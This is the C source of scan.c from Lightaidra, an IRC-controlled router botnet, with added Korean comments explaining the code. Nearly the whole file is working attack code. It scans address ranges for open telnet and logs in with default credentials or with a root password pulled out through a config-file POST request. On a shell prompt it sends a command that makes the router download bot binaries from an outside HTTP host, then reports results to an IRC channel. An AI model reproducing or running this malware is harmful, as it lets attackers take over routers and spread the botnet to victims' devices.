// UTF-8 인코딩

/*
 * scan.c - USE LIGHTAIDRA AT YOUR OWN RISK!
 *
 * Lightaidra - IRC-based mass router scanner/exploiter.
 * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
 *
 * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
 * all applicable local, state and federal laws. Developers assume 
 * no liability and are not responsible for any misuse or damage 
 * caused by this program.
 *
 */

#include "../include/headers.h"

int sockwrite(int sd, const char *fmt, ...);
int cmd_advscan_getpass(sock_t *scan_sp);
void *scan_address(scan_data_t *scan_data); 
int cmd_advscan_control(char *addr, sock_t *sp, requests_t *req,
            unsigned short type); 
int cmd_advscan_join(char *addr, sock_t *sp, requests_t *req,
             unsigned short type); 

/* cmd_scan_central(sock_t *, requests_t *, unsigned short) */ 
/* start scanner with vuln type.  */ 
/* requests_t의 값을 scan_data에 집어넣어 해당 값을 매개변수로 scan_address를 쓰레드를 만들어 실행한다 */
void cmd_scan_central(sock_t *sp, requests_t *req, unsigned short type) {
    unsigned short a, b, c;
    int i, x;
    pthread_t pthds[maxthreads];
    scan_data_t scan_data[maxthreads];	// scan_data_t (scan.h)

    total = 0;
    founds = 0;
    c = 0;

	/* 기존의 result_file을 제거하고 새로 생성한다 */
    sleep(2);
    remove(result_file);
    resfd = fopen(result_file, "a+");
    
	/* resfd에 아무것도 없으면 에러메세지 */
    if (resfd == NULL) {
        sockwrite(sp->sockfd, "PRIVMSG %s :[error] unable to open: %s\n", channel, result_file);
        sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
        exit(EXIT_FAILURE);
    }

    memset(hosts, 0, sizeof hosts);
    
	/* hosts배열에 rcv_sb, rcv_sc, a, b 값을 저장 */
    for (a = 0; a <= 255; a++) {
        for (b = 0; b <= 255; b++) {
            snprintf(hosts[c], sizeof(hosts[c]), "%s.%s.%d.%d", req->rcv_sb, req->rcv_sc, a, b);
            c++;
        }
    }

    for (i = 0; i <= maxhosts;) {
        if (strlen(hosts[i]) < 7) break;

        for (x = 0; x < maxthreads; x++, i++) {
            if (strlen(hosts[i]) < 7) break;

			/* scan_data.hostname에 hosts의 값을 저장한다 */
            memset(scan_data[x].hostname, 0, sizeof(scan_data[x].hostname));
            snprintf(scan_data[x].hostname, 31, "%s", hosts[i]);

			/* 쓰레드를 만들어 scan_address를 돌린다. 생성이 안될시 crash로 이동 */
            if (pthread_create(&pthds[x], NULL, (void *)&scan_address, (scan_data_t *) & scan_data[x]) != 0) {
                if (all_messages) sockwrite(sp->sockfd, "PRIVMSG %s :[crash] scanner has crashed, continuing to pwning..\n", channel);
                goto crash;
            }
        }

        for (x = 0; x < maxthreads; x++) {
            if (strlen(hosts[i]) < 7) break;
            
			/* 위의 쓰레드가 정상적으로 종료 되지 않을경우 crash로 이동 */
            if (pthread_join(pthds[x], NULL) != 0) {
                if (all_messages) sockwrite(sp->sockfd, "PRIVMSG %s :[crash] scanner has crashed, continuing to pwning..\n", channel);
                goto crash;
            }
        }
    }

crash:

    if (!total) {
        if (all_messages) sockwrite(sp->sockfd, "PRIVMSG %s :[advscan] scanner completed, founds %d ips..\n",  channel, total);
        exit(EXIT_SUCCESS);
    } 
    else {
        if (all_messages) sockwrite(sp->sockfd, "PRIVMSG %s :[advscan] scanner completed, founds %d ips, pwning time..\n",  channel, total);
    }

    if ((resfd = fopen(result_file, "r+")) == NULL) {
        sockwrite(sp->sockfd, "PRIVMSG %s :[error] unable to open: %s\n", channel, result_file);
        sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
        exit(EXIT_FAILURE);
    }

    while (fgets(resbuf, sizeof(resbuf) - 1, resfd) != NULL) {
        sscanf(resbuf, "%16s", restag);
    
        if (cmd_advscan_control(restag, sp, req, type) == 0) {
            if (all_messages) {
                if (type == 1) {
                    sockwrite(sp->sockfd, "PRIVMSG %s :[vuln] address: %s (user:%s pass:%s) possible vuln with default password!\n", 
                    channel, restag, req->rcv_sd, req->rcv_se);
                } 
                else if (type == 2) {
                    strncpy(psw_y, psw_x, strlen(psw_x) - 2);
                    sockwrite(sp->sockfd, "PRIVMSG %s :[vuln] address: %s (user:root pass:%s) possible vuln with config file post request!\n", 
                    channel, restag, psw_y);
                }
            }
        }

        memset(restag, 0, sizeof restag);
    }

    fclose(resfd);
    sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
    
    exit(EXIT_FAILURE);
}

/* scan_address(scan_data_t *) */ 
/* start addresses scanner.  */ 
void *scan_address(scan_data_t *scan_data) {
    FILE *rfd;
    int retv, flags;
    fd_set rd, wr;
    char temp[128];
    sock_t *scan_isp;

    scan_isp = (sock_t *) malloc(sizeof(sock_t));

    if (!(scan_isp->sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP))) pthread_exit(NULL);	// 소켓생성(실패시 쓰레드 종료) 

	/* 소켓 포트, 주소체계 할당*/
    memset(temp, 0, sizeof temp);
    memset(&scan_isp->sockadr, 0, sizeof scan_isp->sockadr);
    scan_isp->sockadr.sin_port = htons(telnet_port);
    scan_isp->sockadr.sin_family = AF_INET;

	/* 시간값 할당(tv_sec; 1초, tv_usec: 0.5) */
    timeout_value = 1;
    tm.tv_sec = timeout_value;
    tm.tv_usec = 500000;

	/* hostname의 주소를 32비트값으로 변환해 scan_isp에 저장한다. 실패시엔 소켓을 풀고 쓰레드를 종료한다. */
    if (!inet_aton((const char *)scan_data->hostname, (struct in_addr *)&scan_isp->sockadr.sin_addr)) {
        close(scan_isp->sockfd);
        free(scan_isp);
        pthread_exit(NULL);
    }

	/* sockfd에 대한 플래그값을 반환 */
    flags = fcntl(scan_isp->sockfd, F_GETFL, 0);
    
	/* sockfd를 NONBLOCK모드로 바꿔준다. */
	/* NONBLOCK모드시 기다리지 않고 바로 반환한다. */
    if (fcntl(scan_isp->sockfd, F_SETFL, O_NONBLOCK) == false) {
        close(scan_isp->sockfd);
        free(scan_isp);
        pthread_exit(NULL);
    }

	/* 접속 요청(실패시 소켓풀고 쓰레드 종료) */
    if (connect(scan_isp->sockfd, (struct sockaddr *)&scan_isp->sockadr, sizeof(scan_isp->sockadr)) == -1) {
        if (errno != EINPROGRESS) {
            close(scan_isp->sockfd);
            free(scan_isp);
            pthread_exit(NULL);
        }
    }

	/* wr에 sockfd를 추가*/
    FD_SET(scan_isp->sockfd, &wr);
    
	/* tm간격으로 wr에 등록된 파일들을 검사해 변경된 파일개수를 retv에 리턴한다 */
    if (!(retv = select(scan_isp->sockfd + 1, NULL, &wr, NULL, &tm))) {
        close(scan_isp->sockfd);
        free(scan_isp);
        pthread_exit(NULL);
    } 
    else if (retv == false) {
        close(scan_isp->sockfd);
        free(scan_isp);
        pthread_exit(NULL);
    }

	/* 소켓으로부터 데이터를 수신받아 데이터가 있거나 오류발생시 종료 */
    if (recv(scan_isp->sockfd, temp, sizeof(temp) - 1, 0) != false) {
        close(scan_isp->sockfd);
        free(scan_isp);
        pthread_exit(NULL);
    }

    if (errno != EWOULDBLOCK) {
        close(scan_isp->sockfd);
        free(scan_isp);
        pthread_exit(NULL);
    }

    FD_SET(scan_isp->sockfd, &rd);
    
    if (!(retv = select(scan_isp->sockfd + 1, &rd, NULL, NULL, &tm))) {
        close(scan_isp->sockfd);
        free(scan_isp);
        pthread_exit(NULL);
    } 
    else if (retv == -1) {
        close(scan_isp->sockfd);
        free(scan_isp);
        pthread_exit(NULL);
    } 
    else {
        if ((fcntl(scan_isp->sockfd, F_SETFL, flags)) == false) {
            close(scan_isp->sockfd);
            free(scan_isp);
            pthread_exit(NULL);
        }

        if (recv(scan_isp->sockfd, temp, sizeof(temp) - 1, 0) != false) {
            rfd = fopen(result_file, "a+");
            
            if (rfd != NULL) {
                fprintf(rfd, "%s\n", scan_data->hostname);
                fflush(rfd);
                fclose(rfd);
                total++;
            }
        }
    }

    close(scan_isp->sockfd);
    free(scan_isp);

    pthread_exit(NULL);
}

/* __alarm() */ 
/* for socket timeout. */ 
void __alarm() {
    close(scan_sp->sockfd);
    return;
}

/* cmd_advscan_control(char *, sock_t *, requests_t *) */ 
/* advance scanner init.  */ 
int cmd_advscan_control(char *addr, sock_t *sp, requests_t *req, unsigned short type) {
    if (type == 1) {
        if (cmd_advscan_join(addr, sp, req, 1) == true) {
            founds++;
            return EXIT_SUCCESS;
        } 
        else {
            return EXIT_FAILURE;
        }
    } 
    else if (type == 2) {
        scan_sp = (sock_t *) malloc(sizeof(sock_t));
        scan_sp->sockhs = gethostbyname(addr);
        scan_sp->sockfd = socket(AF_INET, SOCK_STREAM, 0);
        scan_sp->sockadr.sin_family = AF_INET;
        scan_sp->sockadr.sin_port = htons(http_port);
        scan_sp->sockadr.sin_addr = *((struct in_addr *)scan_sp->sockhs->h_addr);
        memset(scan_sp->sockadr.sin_zero, '\0', sizeof scan_sp->sockadr.sin_zero);

        timeout_value = 1;
        tm.tv_sec = timeout_value;
        tm.tv_usec = 500000;

        signal(SIGALRM, __alarm);
        alarm(timeout_value);

        if (connect(scan_sp->sockfd, (struct sockaddr *)&scan_sp->sockadr, sizeof scan_sp->sockadr) == false) {
            alarm(0);
            signal(SIGALRM, SIG_DFL);
            free(scan_sp);
            return EXIT_FAILURE;
        }

        if (cmd_advscan_getpass(scan_sp) == true) {
            close(scan_sp->sockfd);
            free(scan_sp);
        
            if (cmd_advscan_join(addr, sp, req, 2) == true) {
                founds++;
                return EXIT_SUCCESS;
            } 
            else {
                return EXIT_FAILURE;
            }
        }
    }

    close(scan_sp->sockfd);
    free(scan_sp);

    return EXIT_FAILURE;
}

/* cmd_advscan_getpass(sock_t *) */ 
/* advance scanner password finder. */ 
int cmd_advscan_getpass(sock_t *scan_sp) {
    char temp[801];
    char *one, *two;

    if (sockwrite(scan_sp->sockfd, post_request) == false) return EXIT_FAILURE;

    recv(scan_sp->sockfd, temp, 100, 0);
    recv(scan_sp->sockfd, temp, 800, 0);
    one = strtok(temp, "<");

    while (one != NULL) {
        if (strstr(one, "password>")) {
            two = strtok(one, ">");
            
            while (two != NULL) {
                if (strcmp(two, "password") != true) {
                    snprintf(psw_x, strlen(two) + 3, "%s\r\n", two);
                    return EXIT_SUCCESS;
                }

                two = strtok(NULL, ">");
            }
        }

        one = strtok(NULL, "<");
    }

    return EXIT_FAILURE;
}

/* cmd_advscan_join(char *, sock_t *, requests_t *) */ 
/* advance scanner (router validate control).  */ 
int cmd_advscan_join(char *addr, sock_t *sp, requests_t *req, unsigned short type) {
    unsigned short e = 0;

    scan_sp = (sock_t *) malloc(sizeof(sock_t));
    scan_sp->sockhs = gethostbyname(addr);
    scan_sp->sockfd = socket(AF_INET, SOCK_STREAM, 0);
    scan_sp->sockadr.sin_family = AF_INET;
    scan_sp->sockadr.sin_port = htons(telnet_port);

    scan_sp->sockadr.sin_addr = *((struct in_addr *)scan_sp->sockhs->h_addr);
    memset(scan_sp->sockadr.sin_zero, '\0', sizeof scan_sp->sockadr.sin_zero);

    timeout_value = 2;
    tm.tv_sec = timeout_value;
    tm.tv_usec = 500000;

    setsockopt(scan_sp->sockfd, SOL_SOCKET, SO_RCVTIMEO,(char *)&tm,sizeof(struct timeval));

    /* ignore ++ KILLED BY SIGPIPE ++ */
    signal(SIGPIPE, SIG_IGN);

    signal(SIGALRM, __alarm);
    alarm(timeout_value);

    if (connect(scan_sp->sockfd, (struct sockaddr *)&scan_sp->sockadr, sizeof scan_sp->sockadr) == false) {
        alarm(0);
        signal(SIGALRM, SIG_DFL);
        free(scan_sp);
        return EXIT_FAILURE;
    }

    if (type == 1) {
        if (sockwrite(scan_sp->sockfd, "%s\r\n", req->rcv_sd) == false) e++;
        recv(scan_sp->sockfd, __netbuf, sizebuf - 1, 0);

        if (sockwrite(scan_sp->sockfd, "%s\r\n", req->rcv_se) == false) e++;
        recv(scan_sp->sockfd, __netbuf, sizebuf - 1, 0);
    } 
    else if (type == 2) {
        if (send(scan_sp->sockfd, "root\r\n", strlen("root\r\n"), MSG_NOSIGNAL) == false) e++;
    
        recv(scan_sp->sockfd, __netbuf, sizebuf - 1, 0);
        send(scan_sp->sockfd, psw_x, strlen(psw_x), MSG_NOSIGNAL);
        recv(scan_sp->sockfd, __netbuf, sizebuf - 1, 0);
    }

    if (e) {
        close(scan_sp->sockfd);
        free(scan_sp);
        return EXIT_FAILURE;
    }

    memset(__netbuf, 0, sizeof __netbuf);
    recv_bytes = recv(scan_sp->sockfd, __netbuf, sizebuf - 1, 0);

    if (recv_bytes == -1) {
        close(scan_sp->sockfd);
        free(scan_sp);
        return EXIT_FAILURE;
    }
    
    __netbuf[recv_bytes] = 0;

    if (strchr(__netbuf, '#') != NULL || strchr(__netbuf, '$') != NULL) {
        sockwrite(scan_sp->sockfd, getbinaries, reference_http);
        recv(scan_sp->sockfd, __netbuf, sizebuf - 1, 0);
        recv(scan_sp->sockfd, __netbuf, sizebuf - 1, 0);
        sleep(3);

        close(scan_sp->sockfd);
        free(scan_sp);
        return EXIT_SUCCESS;
    }

    close(scan_sp->sockfd);
    free(scan_sp);

    return EXIT_FAILURE;
}
